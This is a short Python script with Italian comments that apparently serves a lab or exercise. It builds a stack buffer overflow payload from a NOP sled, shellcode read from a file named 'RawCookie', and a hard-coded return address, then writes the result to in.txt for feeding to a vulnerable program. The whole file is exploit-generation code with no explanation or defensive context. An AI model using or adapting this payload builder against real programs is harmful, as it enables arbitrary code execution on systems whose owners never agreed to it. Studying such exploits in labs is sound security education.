import struct

buff_len = 80 + 8 #cambia in base al tuo pc
addr = 0x7fffffffd8c0 #cambia in base al tuo pc

f = open('RawCookie', 'rb') #nome del RawFile estratto
shellcode = f.read()
f.close() 

buf = b'\x90' * (buff_len - len(shellcode)) + shellcode + struct.pack('L', addr)

f = open('in.txt', 'wb')
f.write(buf)
f.close()
